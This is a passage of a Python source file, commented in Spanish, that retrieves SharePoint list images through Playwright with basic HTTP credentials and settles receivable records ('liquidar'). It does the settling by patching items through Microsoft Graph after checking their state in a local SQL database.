    if r.status_code != 200:
        raise Exception(f"Error leyendo item {item_id}: {r.status_code}")

    raw_img = r.json().get("fields", {}).get(IMAGE_FIELD)
    img_obj = parse_image_field(raw_img)

    # Construir URL directa del archivo
    srv_abs = img_obj.get("serverUrl")
    srv_rel = img_obj.get("serverRelativeUrl")
    if srv_abs and srv_abs.startswith("http"):
        image_url = srv_abs
    elif srv_rel:
        image_url = f"https://{_sp_cfg('CXC_SP_SITE_HOSTNAME')}{srv_rel}"
    else:
        raise Exception(f"No se encontró URL directa en el campo de imagen (item {item_id})")

    # Remover parámetros de miniaturización
    if "?" in image_url:
        image_url = image_url.split("?")[0]

    log.info("Playwright (Windows Auth): navegando a %s para item %s", image_url, item_id)

    browser = _get_pw_browser()
    if browser is None:
        raise Exception("Playwright no disponible (Chromium no pudo iniciarse)")

    page = None
    context = None
    try:
        sp_auth = _get_sp_basic_auth()
        if sp_auth:
            # Crear un context con http_credentials para Basic HTTP auth
            context = browser.new_context(http_credentials={
                'username': sp_auth[0], 'password': sp_auth[1]
            })
            page = context.new_page()
        else:
            page = browser.new_page()

        # Navegar directamente (si se configuró http_credentials el contexto usará esas credenciales)
        response = page.goto(image_url, timeout=25_000, wait_until="commit")
        
        if response is None:
            raise Exception("Sin respuesta de navegación de Playwright")
        
        if response.status not in (200, 206):
            raise Exception(f"Playwright HTTP {response.status}")
        
        # Obtener el cuerpo de la respuesta
        img_bytes    = response.body()
        content_type = response.headers.get("content-type", "image/jpeg")
        
        log.info("Playwright: imagen obtenida para item %s (%d bytes)", item_id, len(img_bytes))
        _set_cached_image(item_id, img_bytes, content_type)
        return img_bytes, content_type
    
    finally:
            if page:
                try: page.close()
                except Exception: pass
            if context:
                try: context.close()
                except Exception: pass


# ─── Liquidar en SP + SQL ─────────────────────────────────────────────────────

def _mark_item_liquidado(graph_token, site_id, list_id, item_id, liquidadoPor=None):
    h     = {"Authorization": f"Bearer {graph_token}", "Content-Type": "application/json"}
    url   = (
        f"https://graph.microsoft.com/v1.0/sites/{site_id}"
        f"/lists/{list_id}/items/{item_id}/fields"
    )
    fecha = datetime.datetime.utcnow().isoformat() + "Z"
    payload = {"liquidado": "Si", "fechaLiquidado": fecha}
    if liquidadoPor:
        payload["Liquidadopor"] = liquidadoPor

    r = requests.patch(url, headers=h, json=payload, timeout=HTTP_TIMEOUT)
    if r.status_code not in (200, 204):
        # Fallback sin Liquidadopor
        r2 = requests.patch(
            url,
            headers=h,
            json={"liquidado": "Si", "fechaLiquidado": fecha},
            timeout=HTTP_TIMEOUT,
        )
        if r2.status_code not in (200, 204):
            raise Exception(f"Error PATCH item {item_id}: {r.status_code} — {r.text[:200]}")
    return fecha


def liquidar_por_ids(item_ids, liquidadoPor=None):
    """
    Liquida registros por ID, con validaciones de estado.
    
    NO permite liquidar si:
    - estado = 1 (Procesado) → en un lote
    - estado = 2 (Finalizado) → ya cerrado
    - loteId IS NOT NULL → pertenece a un lote
    
    Solo permite liquidar si:
    - estado = 0 (Recibido) → aún disponible para liquidación
    """
    if not item_ids:
        return {"total_candidatos": 0, "actualizados": 0, "errores": 0, "errores_detalle": []}

    graph_token      = get_graph_token()
    h                = {"Authorization": f"Bearer {graph_token}"}
    site_id, list_id = get_site_and_list_ids(graph_token)

    actualizados    = 0
    errores         = 0
    errores_detalle = []
    ids_ok          = []
    fecha_liq       = None

    # Estados: 0=Recibido, 1=Procesado, 2=Finalizado
    _ESTADO_NOMBRES = {0: 'Recibido', 1: 'Procesado', 2: 'Finalizado'}
    
    # Validar estado de cada item en BD ANTES de intentar liquidar
    from admin_disp.core.db import get_db_cxc
    conn_local = get_db_cxc()
    c_local = conn_local.cursor()

    for item_id in item_ids:
        if not item_id:
            continue
        
        # 1. Verificar estado en BD local
        try:
            c_local.execute(
                "SELECT [estado], [loteId] FROM [cobro] WHERE [spItemId] = ?",
                (item_id,)
            )
            row_local = c_local.fetchone()
            
            if row_local:
                estado_local, loteId_local = row_local
                estado_nombre = _ESTADO_NOMBRES.get(estado_local or 0, 'Desconocido')
                
                # Validar: NO liquidar si está en lote o está Procesado/Finalizado
                if estado_local == 1:  # Procesado
                    errores += 1
                    errores_detalle.append(f"Item {item_id}: Estado Procesado (en lote), no se puede liquidar")
                    continue
                if estado_local == 2:  # Finalizado
                    errores += 1
                    errores_detalle.append(f"Item {item_id}: Estado Finalizado (cerrado), no se puede liquidar")
                    continue
                if loteId_local is not None:
                    errores += 1
                    errores_detalle.append(f"Item {item_id}: Pertenece a un lote, no se puede liquidar")
                    continue
        except Exception as exc:
            log.warning(f"liquidar_por_ids: error al validar {item_id} en BD — {exc}")
            # Continuar después de validación fallida (es warning no fatal)
        
        # 2. Verificar en SharePoint que no esté ya liquidado
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/sites/{site_id}"
            f"/lists/{list_id}/items/{item_id}?expand=fields",
            headers=h,
            timeout=HTTP_TIMEOUT,
        )
        if r.status_code != 200:
            errores += 1
            errores_detalle.append(f"Item {item_id}: error al leer en SP ({r.status_code})")
            continue

        lq = str(r.json().get("fields", {}).get("liquidado", "") or "").strip().lower()
        if lq in ("si", "sí"):
            continue

        # 3. Marcar como liquidado
        try:
            fecha_liq = _mark_item_liquidado(
                graph_token, site_id, list_id, item_id, liquidadoPor
            )
            ids_ok.append(item_id)
            actualizados += 1
        except Exception as ex:
            errores += 1
            errores_detalle.append(f"Item {item_id}: {ex}")
            log.error("Error liquidando item %s: %s", item_id, ex)

    if ids_ok:
        update_liquidado_sql(
            ids_ok,
            liquidadoPor or "",
            fecha_liq or datetime.datetime.utcnow().isoformat() + "Z",
        )

    return {
        "total_candidatos": len(item_ids),
        "actualizados":     actualizados,
        "errores":          errores,
        "errores_detalle":  errores_detalle[:5],
    }
